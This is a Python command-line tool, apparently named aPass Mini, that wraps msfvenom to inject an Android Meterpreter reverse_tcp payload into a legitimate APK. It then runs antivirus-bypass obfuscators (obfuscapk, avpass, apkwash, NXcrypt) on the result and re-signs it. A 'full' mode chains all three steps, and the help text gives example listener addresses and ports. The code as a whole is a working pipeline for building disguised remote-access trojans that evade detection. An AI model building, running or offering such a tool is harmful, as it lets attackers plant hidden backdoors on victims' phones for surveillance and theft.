import os
import sys
import shutil
import subprocess
import logging
import argparse
import json
import tempfile
import getpass
import shlex
import ipaddress
from pathlib import Path
from typing import Optional, List, Dict, Tuple
from dataclasses import dataclass
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from logging.handlers import RotatingFileHandler
import atexit
import textwrap
from argparse import RawDescriptionHelpFormatter

__version__ = "1.1.0"
__author__  = "Aiden Azad (V7lthronyx)"
__repo__    = "https://github.com/v74all/apass_mini"

console = Console()

def setup_logging(log_level: str = "INFO") -> None:
    """Setup logging configuration."""
    log_file = Path("apass_mini.log")
    logging.basicConfig(
        level=getattr(logging, log_level.upper()),
        format='%(asctime)s | %(levelname)s | %(name)s | %(message)s',
        handlers=[
            RotatingFileHandler(log_file, maxBytes=5*1024*1024, backupCount=3),
            logging.StreamHandler()
        ]
    )

@dataclass
class Config:
    """Configuration class for aPass Mini."""
    keystore_path: str = "my-release-key.keystore"
    keystore_password: str = ""
    key_alias: str = "my-key-alias"
    key_password: str = ""
    temp_dir: str = ""
    
    def __post_init__(self):
        if not self.temp_dir:
            self.temp_dir = tempfile.mkdtemp(prefix="apass_mini_")
    
    @classmethod
    def load_from_file(cls, config_path: str = "config.json") -> 'Config':
        """Load configuration from JSON file."""
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    data = json.load(f)
                return cls(**data)
            except (json.JSONDecodeError, TypeError) as e:
                console.print(f"[yellow]Warning: Failed to load config: {e}[/yellow]")
        return cls()
    
    def save_to_file(self, config_path: str = "config.json") -> None:
        """Save configuration to JSON file."""
        try:
            with open(config_path, 'w') as f:
                json.dump(self.__dict__, f, indent=2)
            console.print(f"[green]Configuration saved to {config_path}[/green]")
        except Exception as e:
            console.print(f"[red]Failed to save config: {e}[/red]")

def banner():
    art = f"""
[bold magenta]
 
██╗   ██╗███████╗██╗  ████████╗██╗  ██╗██████╗  ██████╗ ███╗   ██╗██╗   ██╗██╗  ██╗
██║   ██║╚════██║██║  ╚══██╔══╝██║  ██║██╔══██╗██╔═══██╗████╗  ██║╚██╗ ██╔╝╚██╗██╔╝
██║   ██║    ██╔╝██║     ██║   ███████║██████╔╝██║   ██║██╔██╗ ██║ ╚████╔╝  ╚███╔╝ 
╚██╗ ██╔╝   ██╔╝ ██║     ██║   ██╔══██║██╔══██╗██║   ██║██║╚██╗██║  ╚██╔╝   ██╔██╗ 
 ╚████╔╝    ██║  ███████╗██║   ██║  ██║██║  ██║╚██████╔╝██║ ╚████║   ██║   ██╔╝ ██╗
  ╚═══╝     ╚═╝  ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝
                                                                                   
                                                                                   
                                                                                   
                                                                                                                         
                                                                                   
[/bold magenta]
[bold green]aPass Mini v{__version__}[/bold green]  [bold cyan]by Aiden Azad (V7lthronyx)[/bold cyan]
[dim]Instagram: @V7lthronyx.core | Parvus Security Subcategory[/dim]
"""
    console.print(Panel.fit(
        art,
        title="[bold yellow]aPass Mini[/bold yellow]",
        subtitle="[blue]Parvus Security[/blue]",
        border_style="bright_blue"
    ))

def run_shell(command: str, task_name: str = "Processing", steps: int = 100, cwd: Optional[str] = None) -> Tuple[bool, str]:
    """Run shell command with progress bar and logging."""
    logger = logging.getLogger(__name__)
    output_lines = []
    
    with Progress(
        SpinnerColumn(), BarColumn(), TextColumn("{task.description}"),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeElapsedColumn(), TimeRemainingColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[green]{task_name}...", total=steps)
        
        try:
            process = subprocess.Popen(
                command, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT, 
                text=True, 
                cwd=cwd
            )
            
            step_size = max(1, steps // 50)  
            current_step = 0
            
            for line in iter(process.stdout.readline, ''):
                if line:
                    line = line.strip()
                    output_lines.append(line)
                    logger.info(line)
                    
                    current_step += step_size
                    if current_step <= steps:
                        progress.update(task, advance=step_size)
            
            process.wait()
            progress.update(task, completed=steps)
            
            output = '\n'.join(output_lines)
            
            if process.returncode == 0:
                logger.info(f"Command successful: {command}")
                return True, output
            else:
                logger.error(f"Command failed with code {process.returncode}: {command}")
                return False, output
                
        except Exception as e:
            logger.error(f"Exception running command: {e}")
            return False, str(e)

def validate_input(value: str, input_type: str = "file") -> bool:
    """Validate user input."""
    if input_type == "file":
        return os.path.isfile(value)
    elif input_type == "ip":
        try:
            ipaddress.ip_address(value)
            return True
        except ValueError:
            return False
    elif input_type == "port":
        try:
            port = int(value)
            return 1 <= port <= 65535
        except ValueError:
            return False
    return True

def check_tool(name: str, install_cmd: Optional[str] = None) -> bool:
    """Check if tool is installed, otherwise try to install."""
    logger = logging.getLogger(__name__)
    
    if shutil.which(name) is not None:
        logger.info(f"Tool {name} is available")
        return True
    
    if install_cmd:
        console.print(f"[yellow][*] {name} is not installed! Installing...[/yellow]")
        success, output = run_shell(install_cmd, task_name=f"Installing {name}")
        if success and shutil.which(name) is not None:
            logger.info(f"Successfully installed {name}")
            return True
        else:
            logger.error(f"Failed to install {name}: {output}")
            return False
    
    logger.warning(f"Tool {name} not found and no install command provided")
    return False

def create_payload(lhost: str, lport: str, src_apk: str, out_apk: str) -> bool:
    """Create Meterpreter Payload APK with enhanced validation."""
    logger = logging.getLogger(__name__)
    
    if not validate_input(src_apk, "file"):
        console.print(f"[red][!] APK not found: {src_apk}[/red]")
        return False
    
    if not validate_input(lhost, "ip"):
        console.print(f"[red][!] Invalid IP address: {lhost}[/red]")
        return False
    
    if not validate_input(lport, "port"):
        console.print(f"[red][!] Invalid port: {lport}[/red]")
        return False
    
    console.print(Panel("[cyan][*] Creating payload with msfvenom...[/cyan]"))
    
    cmd = (f"msfvenom -x {shlex.quote(src_apk)} "
           f"-p android/meterpreter/reverse_tcp "
           f"LHOST={shlex.quote(lhost)} LPORT={shlex.quote(lport)} "
           f"-o {shlex.quote(out_apk)}")
    
    success, output = run_shell(cmd, task_name="Creating Payload", steps=150)
    
    if success and os.path.isfile(out_apk):
        console.print(f"[green][+] Payload created successfully: {out_apk}[/green]")
        logger.info(f"Payload created: {out_apk}")
        return True
    else:
        console.print(f"[red][!] Failed to create payload[/red]")
        logger.error(f"Payload creation failed: {output}")
        return False

def bypass_tools(apk_path: str, tools: List[str]) -> Dict[str, bool]:
    """Apply bypass tools on APK with enhanced error handling."""
    logger = logging.getLogger(__name__)
    results = {}
    
    if not validate_input(apk_path, "file"):
        console.print(f"[red][!] APK not found: {apk_path}[/red]")
        return results
    
    abs_path = os.path.abspath(apk_path)
    base_name = os.path.basename(apk_path)
    
    available = {
        "obfuscapk": f"docker run --rm -v {shlex.quote(f'{os.path.dirname(abs_path)}:/workdir')} claudiugeorgiu/obfuscapk -o Rebuild -o NewAlignment -o NewSignature /workdir/{shlex.quote(base_name)}",
        "avpass": f"avpass --input {shlex.quote(abs_path)} --output avpass_{shlex.quote(base_name)}",
        "apkwash": f"apkwash -i {shlex.quote(abs_path)} -o apkwash_{shlex.quote(base_name)}",
        "nxcrypt": f"sudo ./NXcrypt.py --file={shlex.quote(abs_path)} --output=nxcrypt_{shlex.quote(base_name)}"
    }
    
    table = Table(title="Bypass Tools Results")
    table.add_column("Tool", style="cyan")
    table.add_column("Status", style="green")
    table.add_column("Output File", style="yellow")
    
    for tool in tools:
        if tool in available:
            console.print(f"[blue]>>> Running {tool}...[/blue]")
            success, output = run_shell(available[tool], task_name=f"Bypass: {tool}", steps=100)
            results[tool] = success
            
            status = "[green]Success[/green]" if success else "[red]Failed[/red]"
            output_file = f"{tool}_{base_name}" if success else "N/A"
            table.add_row(tool, status, output_file)
            
            if success:
                logger.info(f"Successfully applied {tool} to {apk_path}")
            else:
                logger.error(f"Failed to apply {tool}: {output}")
        else:
            console.print(f"[red]Unknown tool: {tool}[/red]")
            results[tool] = False
            table.add_row(tool, "[red]Unknown Tool[/red]", "N/A")
    
    console.print(table)
    return results

def generate_keystore(config: Config) -> bool:
    """Generate a new keystore if it doesn't exist."""
    if os.path.exists(config.keystore_path):
        return True
    
    console.print("[yellow][*] Generating new keystore...[/yellow]")
    
    if not config.keystore_password:
        config.keystore_password = getpass.getpass("Enter keystore password: ")
    if not config.key_password:
        config.key_password = getpass.getpass("Enter key password: ")
    
    cmd = (f"keytool -genkeypair -v "
           f"-keystore {shlex.quote(config.keystore_path)} "
           f"-alias {shlex.quote(config.key_alias)} "
           f"-keyalg RSA -keysize 2048 -validity 10000 "
           f"-storepass {shlex.quote(config.keystore_password)} "
           f"-keypass {shlex.quote(config.key_password)} "
           f"-dname 'CN=aPass, OU=Security, O=Parvus, L=Unknown, S=Unknown, C=XX'")
    
    success, output = run_shell(cmd, task_name="Generating keystore", steps=50)
    
    if success:
        console.print(f"[green][+] Keystore generated: {config.keystore_path}[/green]")
        config.save_to_file()
        return True
    else:
        console.print(f"[red][!] Failed to generate keystore[/red]")
        return False

def sign_apk(apk_file: str, method: str = "apksigner", config: Optional[Config] = None) -> bool:
    """Sign APK using apksigner or jarsigner with enhanced security."""
    logger = logging.getLogger(__name__)
    
    if not validate_input(apk_file, "file"):
        console.print(f"[red][!] APK not found: {apk_file}[/red]")
        return False
    
    if config is None:
        config = Config.load_from_file()
    
    if not generate_keystore(config):
        return False
    
    if not config.keystore_password:
        config.keystore_password = getpass.getpass("Enter keystore password: ")
    if not config.key_password and method == "jarsigner":
        config.key_password = getpass.getpass("Enter key password: ")
    
    signed_apk = f"signed_{os.path.basename(apk_file)}"
    
    if method == "apksigner":
        cmd = (f"apksigner sign "
               f"--ks {shlex.quote(config.keystore_path)} "
               f"--ks-pass pass:{shlex.quote(config.keystore_password)} "
               f"--out {shlex.quote(signed_apk)} "
               f"{shlex.quote(apk_file)}")
    else:  
        cmd = (f"jarsigner -verbose "
               f"-keystore {shlex.quote(config.keystore_path)} "
               f"-storepass {shlex.quote(config.keystore_password)} "
               f"-keypass {shlex.quote(config.key_password)} "
               f"-signedjar {shlex.quote(signed_apk)} "
               f"{shlex.quote(apk_file)} {shlex.quote(config.key_alias)}")
    
    success, output = run_shell(cmd, task_name="Signing APK", steps=120)
    
    if success and os.path.isfile(signed_apk):
        console.print(f"[green][+] APK signed successfully: {signed_apk}[/green]")
        logger.info(f"APK signed: {signed_apk}")
        return True
    else:
        console.print(f"[red][!] Failed to sign APK[/red]")
        logger.error(f"APK signing failed: {output}")
        return False

def cleanup_temp_files() -> None:
    """Clean up temporary files and directories."""
    logger = logging.getLogger(__name__)
    temp_patterns = ["*.tmp", "temp_*", "apass_mini_*", "signed_*", "obfuscapk_*", "apkwash_*", "avpass_*", "nxcrypt_*"]
    
    cleaned_count = 0
    for pattern in temp_patterns:
        for temp_file in Path(".").glob(pattern):
            try:
                if temp_file.is_file():
                    temp_file.unlink()
                    cleaned_count += 1
                elif temp_file.is_dir():
                    shutil.rmtree(temp_file)
                    cleaned_count += 1
                logger.info(f"Cleaned up: {temp_file}")
            except Exception as e:
                logger.warning(f"Failed to clean up {temp_file}: {e}")
    
    try:
        log_files = Path(".").glob("apass_mini.log*")
        import time
        week_ago = time.time() - (7 * 24 * 60 * 60)
        
        for log_file in log_files:
            if log_file.stat().st_mtime < week_ago:
                log_file.unlink()
                cleaned_count += 1
                logger.info(f"Cleaned up old log: {log_file}")
    except Exception as e:
        logger.warning(f"Failed to clean up old logs: {e}")
    
    console.print(f"[green]Cleaned up {cleaned_count} files/directories[/green]")

def verify_apk_integrity(apk_path: str) -> bool:
    """Verify APK file integrity and structure."""
    logger = logging.getLogger(__name__)
    
    if not os.path.isfile(apk_path):
        return False
    
    try:
        import zipfile
        with zipfile.ZipFile(apk_path, 'r') as apk_zip:
            required_files = ['AndroidManifest.xml', 'classes.dex']
            apk_files = apk_zip.namelist()
            
            for req_file in required_files:
                if req_file not in apk_files:
                    logger.warning(f"APK missing required file: {req_file}")
                    return False
            
            bad_file = apk_zip.testzip()
            if bad_file:
                logger.error(f"APK corruption detected: {bad_file}")
                return False
                
        logger.info(f"APK integrity verified: {apk_path}")
        return True
        
    except Exception as e:
        logger.error(f"APK integrity check failed: {e}")
        return False

def get_apk_info(apk_path: str) -> Dict[str, str]:
    """Extract basic information from APK file."""
    logger = logging.getLogger(__name__)
    info = {}
    
    try:
        if shutil.which("aapt"):
            cmd = f"aapt dump badging {shlex.quote(apk_path)}"
            success, output = run_shell(cmd, task_name="Getting APK info", steps=30)
            
            if success:
                lines = output.split('\n')
                for line in lines:
                    if line.startswith('package:'):
                        parts = line.split()
                        for part in parts:
                            if part.startswith('name='):
                                info['package'] = part.split('=')[1].strip("'\"")
                            elif part.startswith('versionName='):
                                info['version'] = part.split('=')[1].strip("'\"")
                    elif line.startswith('application-label:'):
                        info['label'] = line.split(':')[1].strip().strip("'\"")
        
        stat = os.stat(apk_path)
        info['size'] = f"{stat.st_size / (1024*1024):.2f} MB"
        info['modified'] = str(Path(apk_path).stat().st_mtime)
        
    except Exception as e:
        logger.warning(f"Failed to get APK info: {e}")
    
    return info

def setup_config_command(args) -> None:
    """Setup configuration interactively."""
    config = Config.load_from_file()
    
    console.print("[bold blue]Configuration Setup[/bold blue]")
    
    config.keystore_path = Prompt.ask("Keystore path", default=config.keystore_path)
    config.key_alias = Prompt.ask("Key alias", default=config.key_alias)
    
    if Confirm.ask("Set keystore password now?"):
        config.keystore_password = getpass.getpass("Keystore password: ")
    
    if Confirm.ask("Set key password now?"):
        config.key_password = getpass.getpass("Key password: ")
    
    config.save_to_file()

def main():
    banner()

    parser = argparse.ArgumentParser(
        prog="aPass Mini",
        description=textwrap.dedent("""
            aPass Mini - APK Penetration Testing & Protection Suite
            -------------------------------------------------------
            A tool to create, obfuscate, and sign Android APKs for security testing.
            Includes payload generation (msfvenom), bypass tools, and signing workflows.
        """),
        epilog=textwrap.dedent("""
            Examples:
              aPass Mini payload -l 192.168.1.10 -p 4444 -s app.apk -o pay.apk
              aPass Mini bypass -i pay.apk -t obfuscapk apkwash
              aPass Mini sign   -i obfuscapk_pay.apk -m apksigner
              aPass Mini full   -l 192.168.1.10 -p 4444 -s app.apk -o pay.apk \
-t obfuscapk apkwash -m apksigner
        """),
        formatter_class=RawDescriptionHelpFormatter
    )
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    parser.add_argument("--log-level", choices=["DEBUG", "INFO", "WARNING", "ERROR"], 
                       default="INFO", help="Set logging level")
    
    subparsers = parser.add_subparsers(dest="cmd", help="Sub-commands")

    config_parser = subparsers.add_parser(
        "config",
        help="Interactively configure keystore settings",
        description="Setup and store keystore path, alias, and passwords for APK signing.",
        epilog="Use this command before signing to persist your configuration.",
        formatter_class=RawDescriptionHelpFormatter
    )

    p1 = subparsers.add_parser(
        "payload",
        help="Generate a Meterpreter payload APK",
        description="Inject a reverse_tcp Meterpreter payload into an existing APK using msfvenom.",
        epilog="Example: aPass Mini payload -l 10.0.0.5 -p 8080 -s original.apk -o payload.apk",
        formatter_class=RawDescriptionHelpFormatter
    )
    p1.add_argument("-l", "--lhost", required=True, help="Server IP address")
    p1.add_argument("-p", "--lport", required=True, help="Port number")
    p1.add_argument("-s", "--src", required=True, help="Source APK path")
    p1.add_argument("-o", "--out", default="payload.apk", help="Output APK name")

    p2 = subparsers.add_parser(
        "bypass",
        help="Apply APK obfuscation and bypass tools",
        description="Run one or more bypass tools (obfuscapk, apkwash, avpass, nxcrypt) on an APK.",
        epilog="Example: aPass Mini bypass -i payload.apk -t obfuscapk apkwash",
        formatter_class=RawDescriptionHelpFormatter
    )
    p2.add_argument("-i", "--input", required=True, help="APK file path")
    p2.add_argument("-t", "--tools", nargs="+", 
                   choices=["obfuscapk", "avpass", "apkwash", "nxcrypt"], 
                   default=["obfuscapk", "apkwash"], help="List of tools")

    p3 = subparsers.add_parser(
        "sign",
        help="Sign an APK using apksigner or jarsigner",
        description="Sign the provided APK with your keystore using the chosen method.",
        epilog="Example: aPass Mini sign -i obfuscapk_payload.apk -m apksigner",
        formatter_class=RawDescriptionHelpFormatter
    )
    p3.add_argument("-i", "--input", required=True, help="APK file path")
    p3.add_argument("-m", "--method", choices=["apksigner", "jarsigner"], 
                   default="apksigner", help="Signing method")

    p4 = subparsers.add_parser(
        "full",
        help="Execute full workflow: payload, bypass, and sign",
        description="Perform payload injection, apply bypass tools, and sign the resulting APK.",
        epilog="Example: aPass Mini full -l 192.168.1.10 -p 4444 -s original.apk -o final.apk \
-t obfuscapk apkwash -m apksigner",
        formatter_class=RawDescriptionHelpFormatter
    )
    p4.add_argument("-l", "--lhost", required=True)
    p4.add_argument("-p", "--lport", required=True)
    p4.add_argument("-s", "--src", required=True)
    p4.add_argument("-o", "--out", default="payload.apk")
    p4.add_argument("-t", "--tools", nargs="+", 
                   choices=["obfuscapk", "avpass", "apkwash", "nxcrypt"], 
                   default=["obfuscapk", "apkwash"])
    p4.add_argument("-m", "--method", choices=["apksigner", "jarsigner"], 
                   default="apksigner")

    p5 = subparsers.add_parser(
        "test",
        help="Test APK integrity and get information",
        description="Verify APK file integrity and display information about the APK.",
        epilog="Example: aPass Mini test -i payload.apk",
        formatter_class=RawDescriptionHelpFormatter
    )
    p5.add_argument("-i", "--input", required=True, help="APK file path to test")

    p6 = subparsers.add_parser(
        "cleanup",
        help="Clean up temporary files",
        description="Remove temporary files and directories created by aPass Mini.",
        formatter_class=RawDescriptionHelpFormatter
    )

    args = parser.parse_args()

    setup_logging(args.log_level)
    logger = logging.getLogger(__name__)
    
    config = Config.load_from_file()
    atexit.register(lambda d=config.temp_dir: shutil.rmtree(d, ignore_errors=True))

    required_tools = [
        ("java", "sudo apt-get update && sudo apt-get install -y default-jdk"),
        ("msfvenom", "sudo apt-get update && sudo apt-get install -y metasploit-framework"),
        ("keytool", None),  
    ]
    
    optional_tools = [
        ("apksigner", "sudo apt-get install -y apksigner"),
        ("zipalign", "sudo apt-get install -y zipalign"),
        ("jarsigner", None), 
    ]
    
    missing_required = []
    for tool_name, install_cmd in required_tools:
        if not check_tool(tool_name, install_cmd):
            missing_required.append(tool_name)
    
    if missing_required:
        console.print(f"[red][!] Missing required tools: {', '.join(missing_required)}[/red]")
        console.print("[yellow]Please install missing tools manually and try again.[/yellow]")
        sys.exit(1)
    
    for tool_name, install_cmd in optional_tools:
        check_tool(tool_name, install_cmd)

    try:
        if args.cmd == "config":
            setup_config_command(args)
        elif args.cmd == "test":
            if not validate_input(args.input, "file"):
                console.print(f"[red][!] APK not found: {args.input}[/red]")
                sys.exit(1)
            
            console.print(f"[cyan]Testing APK: {args.input}[/cyan]")
            
            if verify_apk_integrity(args.input):
                console.print("[green][+] APK integrity check passed[/green]")
            else:
                console.print("[red][!] APK integrity check failed[/red]")
                sys.exit(1)
            
            info = get_apk_info(args.input)
            if info:
                table = Table(title="APK Information")
                table.add_column("Property", style="cyan")
                table.add_column("Value", style="green")
                
                for key, value in info.items():
                    table.add_row(key.capitalize(), value)
                
                console.print(table)
            
            console.print("[green][+] APK test completed successfully[/green]")
        elif args.cmd == "cleanup":
            console.print("[cyan]Cleaning up temporary files...[/cyan]")
            cleanup_temp_files()
            console.print("[green][+] Cleanup completed[/green]")
        elif args.cmd == "payload":
            success = create_payload(args.lhost, args.lport, args.src, args.out)
            sys.exit(0 if success else 1)
        elif args.cmd == "bypass":
            results = bypass_tools(args.input, args.tools)
            success = any(results.values())
            sys.exit(0 if success else 1)
        elif args.cmd == "sign":
            success = sign_apk(args.input, args.method, config)
            sys.exit(0 if success else 1)
        elif args.cmd == "full":
            
            console.print("[bold cyan]Starting full APK processing workflow...[/bold cyan]")
            
            success = create_payload(args.lhost, args.lport, args.src, args.out)
            if not success:
                console.print("[red][!] Payload creation failed. Aborting.[/red]")
                sys.exit(1)
            
            results = bypass_tools(args.out, args.tools)
            if not any(results.values()):
                console.print("[yellow][!] All bypass tools failed, but continuing...[/yellow]")
            
        
            apk_to_sign = args.out
            for tool in args.tools:
                if results.get(tool, False):
                    tool_output = f"{tool}_{os.path.basename(args.out)}"
                    if os.path.isfile(tool_output):
                        apk_to_sign = tool_output
                        break
            
            success = sign_apk(apk_to_sign, args.method, config)
            if success:
                console.print("[bold green][+] Full workflow completed successfully![/bold green]")
                sys.exit(0)
            else:
                console.print("[red][!] Signing failed.[/red]")
                sys.exit(1)
        else:
            parser.print_help()
            
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Operation interrupted by user[/yellow]")
        sys.exit(1)
    except Exception as e:
        logger.exception("Unexpected error occurred")
        console.print(f"[red][!] Unexpected error: {e}[/red]")
        sys.exit(1)

if __name__ == "__main__":
    main()
